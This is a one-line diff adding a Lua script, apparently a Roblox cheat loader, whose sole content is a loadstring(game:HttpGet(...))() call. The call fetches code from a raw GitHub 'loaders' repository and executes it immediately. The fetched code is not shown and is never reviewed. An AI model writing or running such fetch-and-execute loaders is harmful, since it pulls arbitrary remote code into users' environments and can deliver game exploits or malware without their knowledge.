@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/map-southern-mudding-offroading-spam3-jeoozjzpoa8x57.lua"))()
